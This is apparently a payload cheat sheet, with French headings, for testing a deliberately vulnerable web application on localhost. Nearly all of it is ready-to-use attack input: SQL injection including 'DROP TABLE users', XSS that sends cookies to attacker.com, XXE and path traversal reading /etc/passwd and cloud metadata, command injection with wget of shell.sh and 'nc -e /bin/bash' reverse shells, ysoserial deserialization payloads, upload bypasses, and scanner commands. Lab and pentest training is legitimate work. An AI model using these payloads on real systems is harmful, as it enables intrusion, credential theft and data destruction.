# Payloads de Test pour l'Application Vulnérable

## SQL Injection

### Test basique
```
' OR '1'='1
' OR '1'='1' --
' OR '1'='1' #
' OR '1'='1'/*
```

### Union-based SQL Injection
```
' UNION SELECT NULL--
' UNION SELECT id,username,password,email,role,ssn,credit_card FROM users--
' UNION SELECT 1,2,3,4,5,6,7--
```

### Boolean-based Blind SQL Injection
```
' AND 1=1--
' AND 1=2--
' AND (SELECT COUNT(*) FROM users) > 0--
```

### Time-based Blind SQL Injection
```
' AND SLEEP(5)--
' OR IF(1=1, SLEEP(5), 0)--
```

### ORDER BY Injection
```
id; DROP TABLE users--
(SELECT CASE WHEN (1=1) THEN id ELSE username END)
```

## Cross-Site Scripting (XSS)

### Basic XSS
```html
<script>alert('XSS')</script>
<img src=x onerror=alert('XSS')>
<svg onload=alert('XSS')>
<body onload=alert('XSS')>
```

### Cookie Stealing
```html
<script>document.location='http://attacker.com/steal.php?cookie='+document.cookie</script>
<img src=x onerror="fetch('http://attacker.com/steal?c='+document.cookie)">
```

### Advanced XSS
```html
<iframe src="javascript:alert('XSS')">
<input onfocus=alert('XSS') autofocus>
<select onfocus=alert('XSS') autofocus>
<textarea onfocus=alert('XSS') autofocus>
```

## XML External Entity (XXE)

### File Disclosure
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>
```

### Windows File Disclosure
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">
]>
<root>&xxe;</root>
```

### SSRF via XXE
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
]>
<root>&xxe;</root>
```

### Billion Laughs Attack (DoS)
```xml
<?xml version="1.0"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
]>
<root>&lol3;</root>
```

## Path Traversal

### Unix/Linux
```
../../../etc/passwd
....//....//....//etc/passwd
..%2F..%2F..%2Fetc%2Fpasswd
..%252F..%252F..%252Fetc%252Fpasswd
```

### Windows
```
..\..\..\windows\win.ini
....\\....\\....\\windows\\win.ini
..%5C..%5C..%5Cwindows%5Cwin.ini
```

## Command Injection

### Basic Commands
```bash
; ls -la
| whoami
& cat /etc/passwd
`id`
$(whoami)
```

### File Operations
```bash
; cat /etc/passwd
| head /etc/passwd
& tail /etc/shadow
; find / -name "*.conf"
```

### Network Commands
```bash
; curl http://attacker.com
| wget http://attacker.com/shell.sh
& nc attacker.com 4444 -e /bin/bash
```

## Authentication Bypass

### SQL Injection in Login
```
Username: admin' OR '1'='1'--
Password: anything

Username: admin'--
Password:

Username: ' OR '1'='1
Password: ' OR '1'='1
```

### JWT Manipulation
```
# Changer l'algorithme de HS256 à none
# Modifier le payload pour changer le rôle
# Utiliser une clé faible pour brute-force
```

## Insecure Deserialization

### Java Serialization
```bash
# Utiliser ysoserial pour générer des payloads
java -jar ysoserial.jar CommonsCollections6 "calc.exe" | base64

# Payloads pour RCE
java -jar ysoserial.jar CommonsCollections6 "whoami"
java -jar ysoserial.jar CommonsCollections5 "nc -e /bin/sh attacker.com 4444"
```

## File Upload Bypass

### Extensions dangereuses
```
file.jsp
file.jspx
file.php
file.php3
file.php4
file.php5
file.phtml
```

### Double Extension
```
file.jpg.jsp
file.png.php
```

### Null Byte
```
file.jsp%00.jpg
file.php%00.png
```

### MIME Type Manipulation
```
Content-Type: image/jpeg
(mais le fichier est un .jsp)
```

## Broken Access Control

### IDOR (Insecure Direct Object Reference)
```
/user/profile/1
/user/profile/2
/user/profile/3
...
/user/profile/999
```

### Parameter Tampering
```
?userId=1
?userId=2
?role=admin
?isAdmin=true
```

## Sensitive Data Exposure

### Endpoints à tester
```
/user/admin/export
/api/users/all
/backup/
/.git/
/config/
```

## Security Misconfiguration

### Headers manquants à vérifier
```
X-Frame-Options
Content-Security-Policy
Strict-Transport-Security
X-Content-Type-Options
X-XSS-Protection
```

### Information Disclosure
```
/WEB-INF/web.xml
/META-INF/MANIFEST.MF
/error
/admin/
/console/
```

## Tests automatisés

### SQLMap
```bash
sqlmap -u "http://localhost:8080/vulnerable-app/user/search?username=test" --batch --dbs
sqlmap -u "http://localhost:8080/vulnerable-app/user/search?username=test" --batch --dump
```

### OWASP ZAP
```bash
zap-cli quick-scan -s xss,sqli http://localhost:8080/vulnerable-app
zap-cli active-scan http://localhost:8080/vulnerable-app
```

### Nikto
```bash
nikto -h http://localhost:8080/vulnerable-app
```

### Nmap
```bash
nmap -p 8080 -sV --script vuln localhost
```

### Wfuzz
```bash
wfuzz -c -z file,/path/to/wordlist.txt http://localhost:8080/vulnerable-app/FUZZ
```
